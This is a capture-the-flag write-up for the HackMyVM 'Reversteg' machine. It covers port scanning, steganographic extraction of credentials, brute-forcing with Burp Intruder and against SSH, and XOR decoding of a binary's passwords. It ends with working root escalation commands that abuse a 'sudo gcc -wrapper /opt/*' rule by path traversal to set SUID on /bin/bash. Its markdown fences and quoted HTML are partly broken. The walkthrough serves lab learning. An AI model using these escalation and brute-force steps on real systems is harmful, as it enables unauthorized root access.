@@ -1,0 +1,328 @@
+---
+title: Reversteg
+date: '2025-03-01'
+description: ''
+type: writeup
+platform: hackmyvm
+tags:
+  - LINUX
+  - MEDIUM
+  - reverse eng
+cover: /mc/uploads/2025/02/hackmyvm-logo-3.png
+---
+
+# بِسْمِ اللَّهِ الرَّحْمَنِ الرَّحِيمِ
+
+
+In this walkthrough, we'll explore the steps to compromise the Reversteg machine on HackmyVM . We'll cover enumeration, vulnerability discovery,exploitation, and privilege escalation. Let's dive in!
+
+## enumerating Nmap
+
+```bash
+$ nmap -sV 192.168.56.104 -T5 -O
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-01 13:27 +00
+Nmap scan report for 192.168.56.104
+Host is up (0.00060s latency).
+Not shown: 998 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u4 (protocol 2.0)
+80/tcp open  http    nginx 1.14.2
+MAC Address: 08:00:27:FB:BB:A9 (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: Linux 4.15 - 5.8
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+```
+so after gathering information about the target with nmap we see that there is two open ports
+
+- SSH :22
+- Http : 80
+
+so lets go to see what web application running on port 80
+
+i did some addition enumeration with nikto and gobuster but i found that some directories is just redirect to the default page of apache2
+
+after reading the source code of the default page i found some comment :
+
+	
+        " role="button" style="color:#f6f6f4;display:none" tabindex="0">```
+          It works!
+        div>
+	
+        div class="content_section_text">
+```text
+
+And another clue:
+
+```
+
+```bash
+The string "117db0148dc179a2c2245c5a30e63ab0" appears to be a reference to an image file. Based on the hint about "format of photos," I tried accessing this string with various image extensions:
+
+```
+wget http://192.168.56.104/117db0148dc179a2c2245c5a30e63ab0.jpg
+wget http://192.168.56.104/117db0148dc179a2c2245c5a30e63ab0.png
+```bash
+## Steganography
+
+so using strings on both images i found that there is some interisting printable strings
+
+```
+$ strings 117db0148dc179a2c2245c5a30e63ab0.jpg
+
+B219f26695ac66c93de9de70eebeefea4deb071df71b9b7d7ebcc06eca47ff6e4
+..
+..
+TGlmZSBpcyBmdWxsIG9mIHNjZW5lcnksIGxvb2sgY2FyZWZ1bGx5
+
+```bash
+just the decode give us some hints , so after looking on the internet i found that there is a tool that also extract some hidden information about the PNG images named zsteg so we gonna use it and hope something show up :
+
+```
+$ zsteg 117db0148dc179a2c2245c5a30e63ab0.png 
+imagedata           .. text: "\n\n\n\t\t\t\n\n\n"
+b1,rgb,lsb,xy       .. text: "morainelake"
+b1,bgr,msb,xy       .. file: OpenPGP Public Key
+b2,r,lsb,xy         .. text: "UUUUUUUU@"
+b2,g,lsb,xy         .. text: "E@UAUUUUUUUUj"
+b2,g,msb,xy         .. text: "UUUZs-VUU"
+b2,b,lsb,xy         .. text: "EUUUUUUUUV"
+b2,b,msb,xy         .. text: "_UUUoUUe"
+b3,b,msb,xy         .. file: MPEG ADTS, layer I, v2,  96 kbps, Stereo
+b3,rgb,lsb,xy       .. file: PGP Secret Sub-key -
+b4,r,lsb,xy         .. text: "DEUTfgww"
+b4,r,msb,xy         .. text: "M,\"\"\"\"\"\""
+b4,g,lsb,xy         .. text: ["\"" repeated 10 times]
+b4,g,msb,xy         .. text: "HDDDDDDDDDDH"
+b4,b,lsb,xy         .. text: "3\"##2\"\"#33333333333333334DDDDDDDDDD4C333\"\"\""
+b4,b,msb,xy         .. text: ",\"\"\"\"\"\"\"\"\"\","
+```bash
+we have some text in the output we gonna try it , in the first attempt i found that the password to extract some more information with steghide is "morainelake"
+
+```
+$ steghide --extract -sf 117db0148dc179a2c2245c5a30e63ab0.jpg -p "morainelake"
+wrote extracted data to "secret.zip".
+
+$ unzip secret.zip
+Archive: secret.zip
+creating: secret
+[secret.zip] secret/secret.txt password: #morainelake
+extracting: secret/secret.txt
+
+$ cat secret/secret.txt
+morainelake:660930334
+```bash
+So, we obtained credentials to log in via SSH. After reading `note.txt`, we found that the history contains 48 potential flags. Since I have no idea how to identify the correct flag, I decided to use Burp Suite Intruder to try each flag one by one. Using Burp Suite, I discovered that the correct flag is `flag{f8xxxxxx}`.Next, I used `linpeas.sh` to check for vulnerabilities on the machine or anything interesting that could help me escalate privileges to root. After running the script, I found the following:
+
+- Another user named "welcome"
+- An executable program at `/opt/reverse`
+
+## Reverse Eng
+
+I analyzed the binary using Ghidra (u can use IDA pro)to understand its functionality. The decompiled code revealed:
+
+```
+
+undefined8 main(void)
+
+{
+  int iVar1;
+  undefined4 local_ef;
+  undefined2 local_eb;
+  undefined1 local_e9;
+  char local_e8 [21];
+  undefined4 local_d3;
+  undefined2 local_cf;
+  undefined1 local_cd;
+  undefined8 local_cc;
+  undefined1 local_c4;
+  undefined4 local_c3;
+  undefined2 local_bf;
+  undefined1 local_bd;
+  undefined4 local_bc;
+  undefined1 local_b8 [32];
+  undefined1 local_98 [32];
+  undefined1 local_78 [32];
+  char local_58 [24];
+  void *local_40;
+  undefined4 local_38;
+  undefined1 local_31;
+  void *local_30;
+  void *local_28;
+  void *local_20;
+  void *local_18;
+  char local_d;
+  int local_c;
+  
+  puts("Enter passwords or Enter H coward mode:");
+  local_c = 0;
+  do {
+    __isoc99_scanf(&DAT_00102030,local_e8);
+    iVar1 = strcmp(local_e8,"H");
+    if (iVar1 != 0) {
+      strcpy(local_58,local_e8);
+      __isoc99_scanf("%s %s %s",local_78,local_98,local_b8);
+      goto LAB_0010144d;
+    }
+    local_c = local_c + 1;
+  } while (local_c != 100);
+  puts("Hint: Invert XOR Replace! ");
+LAB_0010144d:
+  local_bc = 0x7d2c39;
+  local_c3 = 0x38202c2f;
+  local_bf = 0x283a;
+  local_bd = 0;
+  local_cc = 0x7a7b78797d7c2121;
+  local_c4 = 0;
+  local_d3 = 0x29243b28;
+  local_cf = 9000;
+  local_cd = 0;
+  local_d = 'M';
+  local_18 = (void *)xor_decrypt(&local_cc,0x4d);
+  local_20 = (void *)xor_decrypt(&local_c3,(int)local_d);
+  local_28 = (void *)xor_decrypt(&local_bc,(int)local_d);
+  local_30 = (void *)xor_decrypt(&local_d3,(int)local_d);
+  iVar1 = check_passwords(local_58,local_78,local_98,local_b8,local_18,local_20,local_28,local_30);
+  if (iVar1 == 0) {
+    puts("[-] Incorrect password!");
+  }
+  else {
+    local_ef = 0x67797670;
+    local_eb = 0x626f;
+    local_e9 = 0;
+    local_31 = 0x6a;
+    local_38 = 10;
+    local_40 = (void *)caesar_decrypt(&local_ef,10);
+    printf("[+] Enter the password successfully! you know: %s\n",local_40);
+    free(local_40);
+  }
+  free(local_18);
+  free(local_20);
+  free(local_28);
+  free(local_30);
+  return 0;
+}
+```bash
+so using the hint provided on the code we can see that we need to encrypt using xor
+
+- local\_c3 = 0x38202c2f
+- local\_cc = 0x7a7b78797d7c2121
+- local\_bc = 0x7d2c39
+- local\_d3 = 0x29243b28
+
+Let’s break down the reverse engineering process, focusing on **little-endian** byte order and **XOR encryption**, which were critical to solving this challenge.
+
+### **What is Little-Endian?**
+
+**Definition**: Little-endian is a way computers store multi-byte values in memory. In little-endian systems, the computer stores the "least significant byte" (the smallest part of the number) at the lowest memory address, and the "most significant byte" (the largest part of the number) at the highest memory address.
+
+**Simplified Explanation**: Think of it like writing a number backward. Instead of writing a multi-digit number from left to right (like we normally do), little-endian stores it from right to left.
+
+**Why It Matters**: When analyzing binary data, misinterpreting the byte order will completely change the values you're looking at. This is especially critical in cryptography and reverse engineering - if you read the bytes in the wrong order, your decryption attempts will fail.
+
+Example: The hex value `0x12345678` is stored in memory as `78 56 34 12`.
+
+**Real-world Context**: Many common computer architectures like x86 and x86-64 (used in most desktop and laptop computers) use little-endian byte ordering, while some network protocols use big-endian (also called "network byte order"). This difference can cause issues when transferring data between different systems if not properly accounted for.
+
+(Btw: In **big-endian** (the way humans typically read) in the previous example the bytes would be stored in memory as **12 34 56 78**)
+
+**Applied to the Challenge**
+
+In the decompiled code, variables like `local_cc` stored hex values in little-endian format:
+
+```
+Original (hex): 7a 7b 78 79 7d 7c 21 21  
+Little-endian bytes: 21 21 7c 7d 79 78 7b 7a
+```bash
+**XOR in Cryptography**
+
+- **Encryption**: `Plaintext ⊕ Key = Ciphertext`
+- **Decryption**: `Ciphertext ⊕ Key = Plaintext`
+
+**Identify the XOR Key**
+
+The variable `local_d` in the decompiled code was set to `'M'` (ASCII `0x4D`):  
+**Apply XOR to Little-Endian Bytes**
+
+```
+0x21 ^ 0x4D = 0x6C (ASCII 'l')
+0x21 ^ 0x4D = 0x6C (ASCII 'l')
+0x7C ^ 0x4D = 0x31 (ASCII '1')
+0x7D ^ 0x4D = 0x30 (ASCII '0')
+0x79 ^ 0x4D = 0x34 (ASCII '4')
+0x78 ^ 0x4D = 0x35 (ASCII '5')
+0x7B ^ 0x4D = 0x36 (ASCII '6')
+0x7A ^ 0x4D = 0x37 (ASCII '7')
+ll104567
+```text
+Applying the same process to the other variables, I determined the complete input required was:
+
+```
+Enter passwords or Enter H coward mode:
+ll104567
+bamuwe ta0 eviden
+[+] Enter the password successfully! you know: flower
+```bash
+
+so i was confused where is the password so to avoid that i create a list that have these words and i brute force the ssh port and i found that the password is "**ll104567bamuweta0eviden**"
+
+## Priv escalation
+
+we are success to authenticate with welcome
+
+```
+bash-5.0$ whoami
+welcome
+bash-5.0$ sudo -l
+Matching Defaults entries for welcome on reversteg:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User welcome may run the following commands on reversteg:
+    (ALL : ALL) NOPASSWD: /usr/bin/gcc -wrapper /opt/*
+```bash
+The sudo rule allows running `/usr/bin/gcc` with the `-wrapper` flag pointing to anything in `/opt/*`. This can be exploited through path traversal.
+
+Created a malicious script to set the SUID bit on `/bin/bash`:
+
+```
+echo '#!/bin/bash' > /tmp/exploit.sh
+echo 'chmod +s /bin/bash' >> /tmp/exploit.sh
+chmod +x /tmp/exploit.sh
+```bash
+
+```
+bash-5.0$ cat exploit.sh 
+#!/bin/bash
+chmod +s /bin/bash
+```bash
+so after looking how the /usr/bin/gcc works i found :  
+The `-wrapper` flag in GCC allows executing a program during compilation:
+
+```
+gcc -wrapper , 
+```bash
+Exploited the wildcard by using path traversal to point to our script:
+
+```
+bash-5.0$ sudo /usr/bin/gcc -wrapper /opt/../../tmp/exploit.sh . 
+# or u can directly use this one without create a file exploit.sh
+bash-5.0$ /bin/bash -p
+bash-5.0# whoami
+root
+```text
+so u can read the flag
+
+## Key takeaway:
+
+1. **Steganography Tools**: Use `strings`, `zsteg`, and `steghide` to uncover hidden data in images.
+2. **Reverse Engineering**: Analyze binaries with Ghidra/IDA to decrypt XOR-encoded strings.
+3. **Sudo Wildcard Abuse**: Exploit path traversal in sudo rules to escalate privileges.
+
+## MY POV
+
+This was my first experience with reverse engineering, and I found it incredibly rewarding. Reading the decompiled code and understanding how the program actually worked was challenging but fascinating. Though it was tough at times, the learning process was enjoyable and extremely valuable. I gained significant insights into binary analysis .
+
+```
